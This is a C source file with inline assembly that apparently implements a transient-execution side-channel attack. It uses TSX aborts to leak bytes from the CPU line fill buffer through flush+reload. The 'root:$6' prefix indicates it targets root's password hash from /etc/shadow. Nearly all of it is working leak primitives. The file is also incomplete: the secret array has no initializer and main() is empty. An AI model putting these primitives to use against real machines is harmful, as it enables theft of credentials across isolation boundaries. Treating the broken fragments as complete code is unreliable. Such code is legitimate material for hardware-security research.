#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <sys/mman.h>
#include <string.h>
#include <immintrin.h>

#include "util.h"

#define CONFIDENCE_SCORE 1
#define DEFAULT_URL "root:$6"
#define DEFAULT_URL_END ":0:9999"
#define PHASE2_MAX_ROUNDS 15000000
#define PHASE2_MIN_LEAKED_BYTES 3


unsigned char __attribute__((aligned(4096))) *buf;
unsigned char __attribute__((aligned(4096))) *buf2;
unsigned char __attribute__((aligned(4096))) *leak_mapping;
unsigned char hist[SECRET_LEN][BUF_SIZE];
unsigned char secret[SECRET_LEN+1] = 


static inline __attribute__((always_inline)) void tsxabort_leak_clflush(
    unsigned char *leak, unsigned char *flushbuffer,
    register uintptr_t index, register uintptr_t mask,
    unsigned char *reloadbuffer1, unsigned char *reloadbuffer2) {
	asm volatile(
    "movq $0xffffffffffffff, %%r11\n"
	"clflush (%0)\n"
	"sfence\n"
	"clflush (%1)\n"

	"xbegin 1f\n"
    "vsqrtps %%xmm0, %%xmm0\n"
    "vsqrtps %%xmm0, %%xmm0\n"
    "vsqrtps %%xmm0, %%xmm0\n"
    "vsqrtps %%xmm0, %%xmm0\n"
    "vsqrtps %%xmm0, %%xmm0\n"
    "vsqrtps %%xmm0, %%xmm0\n"
    "vsqrtps %%xmm0, %%xmm0\n"
    "vsqrtps %%xmm0, %%xmm0\n"
    "vsqrtps %%xmm0, %%xmm0\n"
    "vsqrtps %%xmm0, %%xmm0\n"

    // Leak from LFB
	"movq (%0), %%rax\n"       
    "xorq  %2, %%rax\n"             
    "movq %%rax, %%r12\n"           
    "andq %%r11, %%rax\n"           
    "rol $0x10, %%rax\n"            
	"shl $0xc, %%rax\n"             
	"movq (%%rax, %3), %%rax\n"     


    "rol $0x10, %%r12\n"            
    "shr $0x8, %%r12\n"             
    "shl $0xc, %%r12\n"             
    "movq (%%r12, %4), %%r12\n"     // copy from [%%r12+%4] -> touch value in reloadbuffer2


    "movq 0x23000(%3), %%rax\n"
    "movq 0x23000(%3), %%rax\n"
    "movq 0x23000(%3), %%rax\n"
    "movq 0x23000(%3), %%rax\n"

	"xend\n"
	"1:\n"
	:
    :"r"(leak+index), "r"(flushbuffer), "r"(mask), "r"(reloadbuffer1), "r"(reloadbuffer2)
    :"rax", "r11", "r12"
	);
    mfence();
}

static inline __attribute__((always_inline)) void tsxabort_leak_clflush_reverse_single(
    unsigned char *leak, unsigned char *flushbuffer,
    register uintptr_t index, register uintptr_t mask,
    unsigned char *reloadbuffer1, unsigned char *reloadbuffer2) {
	asm volatile(
	"clflush (%0)\n"
	"sfence\n"
	"clflush (%1)\n"

	"xbegin 1f\n"
    "vsqrtps %%xmm0, %%xmm0\n"
    "vsqrtps %%xmm0, %%xmm0\n"
    "vsqrtps %%xmm0, %%xmm0\n"
    "vsqrtps %%xmm0, %%xmm0\n"
    "vsqrtps %%xmm0, %%xmm0\n"
    "vsqrtps %%xmm0, %%xmm0\n"
    "vsqrtps %%xmm0, %%xmm0\n"
    "vsqrtps %%xmm0, %%xmm0\n"
    "vsqrtps %%xmm0, %%xmm0\n"
    "vsqrtps %%xmm0, %%xmm0\n"

    // Leak from LFB
	"movq (%0), %%rax\n"          
    "xorq  %2, %%rax\n"            
    "shl $0xc, %%rax\n"             
	"movq (%%rax, %3), %%rax\n"     


    "movq 0x23000(%3), %%rax\n"
    "movq 0x23000(%3), %%rax\n"
    "movq 0x23000(%3), %%rax\n"
    "movq 0x23000(%3), %%rax\n"

	"xend\n"
	"1:\n"
	:
    :"r"(leak+index), "r"(flushbuffer), "r"(mask), "r"(reloadbuffer1), "r"(reloadbuffer2)
    :"rax", "r11", "r12"
	);
    mfence();
}

static inline __attribute__((always_inline)) void tsxabort_leak_clflush_reverse(
    unsigned char *leak, unsigned char *flushbuffer,
    register uintptr_t index, register uintptr_t mask,
    unsigned char *reloadbuffer1, unsigned char *reloadbuffer2) {
	asm volatile(
    "movq $0xffffffffffff00ff, %%r11\n"
	"clflush (%0)\n"
	"sfence\n"
	"clflush (%1)\n"

	"xbegin 1f\n"
    "vsqrtps %%xmm0, %%xmm0\n"
    "vsqrtps %%xmm0, %%xmm0\n"
    "vsqrtps %%xmm0, %%xmm0\n"
    "vsqrtps %%xmm0, %%xmm0\n"
    "vsqrtps %%xmm0, %%xmm0\n"
    "vsqrtps %%xmm0, %%xmm0\n"
    "vsqrtps %%xmm0, %%xmm0\n"
    "vsqrtps %%xmm0, %%xmm0\n"
    "vsqrtps %%xmm0, %%xmm0\n"
    "vsqrtps %%xmm0, %%xmm0\n"

    // Leak from LFB
	"movq (%0), %%rax\n"            
    "xorq  %2, %%rax\n"            
    "movq %%rax, %%r12\n"         
    "shr $0x8, %%rax\n"          
	"shl $0xc, %%rax\n"             
	"movq (%%rax, %3), %%rax\n"     
    // Leak 2nd byte in separate buffer
    "andq %%r11, %%r12\n"            
    "shl $0xc, %%r12\n"             
    "movq (%%r12, %4), %%r12\n"     

    "movq 0x23000(%3), %%rax\n"
    "movq 0x23000(%3), %%rax\n"
    "movq 0x23000(%3), %%rax\n"
    "movq 0x23000(%3), %%rax\n"

	"xend\n"
	"1:\n"
	:
    :"r"(leak+index), "r"(flushbuffer), "r"(mask), "r"(reloadbuffer1), "r"(reloadbuffer2)
    :"rax", "r11", "r12"
	);
    mfence();
}


int main(int argc, char* argv[]) {

 
    return 0;
}
